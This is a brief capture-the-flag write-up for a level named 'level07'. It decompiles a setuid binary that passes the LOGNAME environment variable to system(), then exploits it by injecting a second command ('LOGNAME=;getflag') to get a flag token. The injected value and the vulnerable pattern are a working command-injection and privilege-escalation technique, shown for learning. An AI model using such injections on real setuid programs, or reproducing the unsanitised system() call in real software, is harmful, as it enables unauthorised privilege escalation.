What do we have?

	$ ll
	total 24
	dr-x------ 1 level07 level07  120 Mar  5  2016 ./
	d--x--x--x 1 root    users    340 Aug 30  2015 ../
	-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
	-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
	-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*

A binary `level07`, with the rights to launch as owner... Let's pass it to `Ghidra`:

	/* WARNING: Unknown calling convention */

	int main(int argc,char **argv,char **envp)

	{
	char *pcVar1;
	int iVar2;
	char *buffer;
	gid_t gid;
	uid_t uid;
	char *local_1c;
	__gid_t local_18;
	__uid_t local_14;
	
	local_18 = getegid();
	local_14 = geteuid();
	setresgid(local_18,local_18,local_18);
	setresuid(local_14,local_14,local_14);
	local_1c = (char *)0x0;
	pcVar1 = getenv("LOGNAME");
	asprintf(&local_1c,"/bin/echo %s ",pcVar1);
	iVar2 = system(local_1c);
	return iVar2;
	}

So, it's a binary that runs `/bin/echo`, and give as argument an expansion of the env variable `LOGNAME`. There, we can end the call to `echo`, and launch `getflag` behind it.

	$ export "LOGNAME=;getflag"
	$ ./level07
	
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
